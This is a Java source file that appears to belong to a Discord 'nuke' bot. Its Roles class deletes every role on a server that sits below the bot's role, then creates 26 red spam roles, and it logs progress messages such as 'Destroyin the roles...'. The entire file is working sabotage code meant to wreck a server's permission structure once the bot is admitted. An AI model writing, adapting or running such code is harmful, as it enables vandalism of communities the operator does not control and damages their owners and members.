package com.cooleg.bot.Parts;

import com.cooleg.bot.Bot;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.exceptions.ContextException;
import net.dv8tion.jda.api.requests.restaction.RoleAction;

import java.util.List;

public class Roles {

    private Guild guild;


    public Roles(Guild guild) throws InterruptedException {
//        if (!Bot.nukeroles) {return;}
        this.guild = guild;

        bombRoles();
        spamRoles();

    }

    public void bombRoles() throws InterruptedException {
        List<Role> roleList = guild.getRoles();

        System.out.println("Destroyin the roles...");
        for (Role role : roleList) {
            if (!role.isManaged() && guild.getPublicRole() != role && role.getPosition() < guild.getBotRole().getPosition()) {
                try {
                    role.delete().queue();
                    System.out.println("Role: " + role.getName() + " was deleted");
                } catch (Exception e) {
                    System.out.println("Nearing end of roles");
                }
                Thread.sleep(30);
            }
        }

        System.out.println("Roles allll gone");
        return;
    }

    public void spamRoles() throws InterruptedException {
        System.out.println("Spamming roles...");
        for (int i=0; i<=25; i++) {
            try {
                RoleAction newRole = guild.createRole();
                newRole.setColor(0xFF0000);
                newRole.setName(Bot.rolenames);
                newRole.queue();
            } catch (Exception e) {
                System.out.println("Well smthn broke with the role spammer");
            }
            Thread.sleep(30);
        }
        System.out.println("Done spamming roles...");
        return;
    }

}
